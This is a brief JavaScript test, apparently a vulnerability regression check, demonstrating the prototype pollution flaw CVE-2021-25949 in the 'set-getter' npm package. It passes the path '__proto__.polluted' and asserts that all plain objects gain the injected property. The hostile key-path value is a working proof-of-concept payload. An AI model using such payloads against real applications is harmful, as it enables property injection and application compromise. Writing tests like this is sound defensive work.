//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949
test("prototype pollution in set-getter ", () => {
  var setGetter = require("set-getter");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setGetter(obj, "__proto__.polluted", function (polluted) {
    return "yes";
  });
  expect({}.polluted).toBe("yes");
});
